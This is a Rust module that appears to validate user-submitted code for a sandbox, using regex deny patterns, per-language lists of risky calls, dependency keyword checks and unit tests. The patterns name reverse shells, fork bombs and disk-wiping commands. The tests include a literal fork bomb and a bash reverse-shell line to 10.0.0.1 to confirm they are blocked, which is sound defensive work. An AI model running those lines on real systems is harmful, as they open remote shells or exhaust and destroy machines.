use std::collections::HashMap;
use regex::Regex;
use once_cell::sync::Lazy;

/// Maximum code size in bytes (1MB)
const MAX_CODE_SIZE: usize = 1_048_576;

/// Maximum number of dependencies allowed
const MAX_DEPENDENCIES: usize = 20;

/// Dangerous patterns that should be blocked
static DANGEROUS_PATTERNS: Lazy<Vec<DangerousPattern>> = Lazy::new(|| {
    vec![
        // Fork bombs
        DangerousPattern {
            pattern: Regex::new(r":\(\)\{.*:\|:&\};:").unwrap(),
            description: "Fork bomb pattern detected",
            severity: Severity::Critical,
        },
        DangerousPattern {
            pattern: Regex::new(r"while\s+true.*fork|fork.*while\s+true").unwrap(),
            description: "Potential fork bomb loop detected",
            severity: Severity::Critical,
        },
        // Network scanning/attacks
        DangerousPattern {
            pattern: Regex::new(r"nmap|masscan|zmap").unwrap(),
            description: "Network scanning tool detected",
            severity: Severity::Critical,
        },
        // Crypto mining
        DangerousPattern {
            pattern: Regex::new(r"xmrig|ethminer|cgminer|bfgminer|cryptonight").unwrap(),
            description: "Cryptocurrency mining software detected",
            severity: Severity::Critical,
        },
        // Reverse shells
        DangerousPattern {
            pattern: Regex::new(r"/bin/(bash|sh).*-i|nc.*-e\s+/bin/(bash|sh)|bash\s+-i\s+>&\s+/dev/tcp").unwrap(),
            description: "Reverse shell pattern detected",
            severity: Severity::Critical,
        },
        // File system destruction
        DangerousPattern {
            pattern: Regex::new(r"rm\s+-rf\s+/|dd\s+if=/dev/(zero|random)\s+of=/dev/").unwrap(),
            description: "Potentially destructive file system operation",
            severity: Severity::High,
        },
        // SQL injection attempts (in code strings)
        DangerousPattern {
            pattern: Regex::new(r"(union.*select|drop\s+table|delete\s+from.*where\s+1=1)").unwrap(),
            description: "SQL injection pattern detected",
            severity: Severity::Medium,
        },
        // Excessive loops (simple detection)
        DangerousPattern {
            pattern: Regex::new(r"while\s*\(\s*1\s*\)|while\s+True|for\s*\(\s*;\s*;\s*\)").unwrap(),
            description: "Infinite loop pattern detected",
            severity: Severity::Medium,
        },
    ]
});

/// Dangerous imports/modules that should be restricted
static DANGEROUS_IMPORTS: Lazy<HashMap<&str, Vec<&str>>> = Lazy::new(|| {
    let mut map = HashMap::new();

    // Python dangerous imports
    map.insert("Python", vec![
        "os.system",
        "subprocess.Popen",
        "eval(",
        "exec(",
        "__import__",
        "compile(",
        "globals(",
        "locals(",
    ]);

    // Node dangerous patterns
    map.insert("Node", vec![
        "child_process",
        "eval(",
        "Function(",
        "require('vm')",
    ]);

    // Rust unsafe
    map.insert("Rust", vec![
        "std::process::Command",
        "unsafe {",
    ]);

    // Go dangerous
    map.insert("Go", vec![
        "exec.Command",
        "syscall.",
    ]);

    // Ruby dangerous
    map.insert("Ruby", vec![
        "system(",
        "exec(",
        "eval(",
        "`",
        "Kernel.eval",
    ]);

    map
});

#[derive(Debug, Clone)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone)]
pub struct DangerousPattern {
    pattern: Regex,
    description: &'static str,
    severity: Severity,
}

#[derive(Debug)]
pub struct SecurityViolation {
    pub description: String,
    pub severity: Severity,
    pub should_block: bool,
}

#[derive(Debug)]
pub struct CodeValidationResult {
    pub is_safe: bool,
    pub violations: Vec<SecurityViolation>,
}

/// Validates code for security concerns
pub fn validate_code(code: &str, language: &str, dependencies: &[String]) -> CodeValidationResult {
    let mut violations = Vec::new();

    // Check code size
    if code.len() > MAX_CODE_SIZE {
        violations.push(SecurityViolation {
            description: format!("Code size {} exceeds maximum allowed size of {} bytes",
                code.len(), MAX_CODE_SIZE),
            severity: Severity::High,
            should_block: true,
        });
    }

    // Check dependency count
    if dependencies.len() > MAX_DEPENDENCIES {
        violations.push(SecurityViolation {
            description: format!("Number of dependencies {} exceeds maximum allowed of {}",
                dependencies.len(), MAX_DEPENDENCIES),
            severity: Severity::Medium,
            should_block: true,
        });
    }

    // Check for dangerous patterns
    for pattern_def in DANGEROUS_PATTERNS.iter() {
        if pattern_def.pattern.is_match(code) {
            let should_block = matches!(pattern_def.severity, Severity::Critical | Severity::High);
            violations.push(SecurityViolation {
                description: pattern_def.description.to_string(),
                severity: pattern_def.severity.clone(),
                should_block,
            });
        }
    }

    // Check for dangerous language-specific imports
    if let Some(dangerous_imports) = DANGEROUS_IMPORTS.get(language) {
        for import in dangerous_imports {
            if code.contains(import) {
                violations.push(SecurityViolation {
                    description: format!("Potentially dangerous import/pattern detected: {}", import),
                    severity: Severity::Medium,
                    should_block: false, // Warning only for imports
                });
            }
        }
    }

    // Check dependencies for suspicious packages
    for dep in dependencies {
        if is_suspicious_dependency(dep) {
            violations.push(SecurityViolation {
                description: format!("Suspicious dependency detected: {}", dep),
                severity: Severity::High,
                should_block: true,
            });
        }
    }

    let is_safe = !violations.iter().any(|v| v.should_block);

    CodeValidationResult {
        is_safe,
        violations,
    }
}

/// Check if a dependency name looks suspicious
fn is_suspicious_dependency(dep: &str) -> bool {
    let suspicious_keywords = [
        "miner", "mining", "crypto", "xmr", "monero",
        "botnet", "exploit", "payload", "backdoor",
        "keylog", "stealer", "ransomware",
    ];

    let dep_lower = dep.to_lowercase();
    suspicious_keywords.iter().any(|keyword| dep_lower.contains(keyword))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fork_bomb_detection() {
        let code = ":(){ :|:& };:";
        let result = validate_code(code, "Python", &[]);
        assert!(!result.is_safe);
        assert!(result.violations.iter().any(|v|
            v.description.contains("Fork bomb") && v.should_block
        ));
    }

    #[test]
    fn test_code_size_limit() {
        let code = "a".repeat(MAX_CODE_SIZE + 1);
        let result = validate_code(&code, "Python", &[]);
        assert!(!result.is_safe);
        assert!(result.violations.iter().any(|v|
            v.description.contains("Code size") && v.should_block
        ));
    }

    #[test]
    fn test_safe_code() {
        let code = "print('hello world')";
        let result = validate_code(code, "Python", &[]);
        assert!(result.is_safe);
    }

    #[test]
    fn test_dangerous_import_warning() {
        let code = "import os; os.system('ls')";
        let result = validate_code(code, "Python", &[]);
        // Should warn but not block (imports alone aren't blocked)
        assert!(result.violations.iter().any(|v|
            v.description.contains("dangerous import")
        ));
    }

    #[test]
    fn test_suspicious_dependency() {
        let deps = vec!["cryptominer".to_string()];
        let result = validate_code("print('hi')", "Python", &deps);
        assert!(!result.is_safe);
        assert!(result.violations.iter().any(|v|
            v.description.contains("Suspicious dependency") && v.should_block
        ));
    }

    #[test]
    fn test_too_many_dependencies() {
        let deps = (0..MAX_DEPENDENCIES + 1)
            .map(|i| format!("package{}", i))
            .collect::<Vec<_>>();
        let result = validate_code("print('hi')", "Python", &deps);
        assert!(!result.is_safe);
    }

    #[test]
    fn test_reverse_shell_detection() {
        let code = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1";
        let result = validate_code(code, "Python", &[]);
        assert!(!result.is_safe);
        assert!(result.violations.iter().any(|v|
            v.description.contains("Reverse shell")
        ));
    }
}